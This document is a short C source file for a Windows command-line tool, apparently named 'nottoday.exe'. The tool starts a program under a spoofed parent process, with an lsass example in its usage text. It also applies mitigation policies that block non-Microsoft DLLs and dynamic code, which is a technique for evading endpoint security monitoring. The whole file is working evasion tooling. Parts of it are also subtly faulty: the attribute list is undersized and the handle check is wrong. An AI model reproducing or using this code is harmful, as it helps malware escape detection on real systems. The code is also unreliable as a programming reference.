#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[])
{
	STARTUPINFOEXA si;
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;

	if (argc < 3) {
		printf("Usage: nottoday.exe <executable> <pid>\nExample: PS> nottoday.exe notepad.exe $(ps -name lsass).id\n");
		return 1;
	}

	int pid = atoi(argv[2]);
	HANDLE hParentProcess = OpenProcess(MAXIMUM_ALLOWED, false, pid);
	if (hParentProcess == INVALID_HANDLE_VALUE) {
		printf("Failed to get handle to process with pid: %d\n", pid);
	}
	ZeroMemory(&si, sizeof(STARTUPINFOEXA));
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL);
	DWORD64 blockDllLoadPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &blockDllLoadPolicy, sizeof(DWORD64), NULL, NULL);
	DWORD64 blockInjectPolicy = PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON;
	UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &blockInjectPolicy, sizeof(DWORD64), NULL, NULL);

	CreateProcessA(NULL, (LPSTR)argv[1], NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);
	
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}
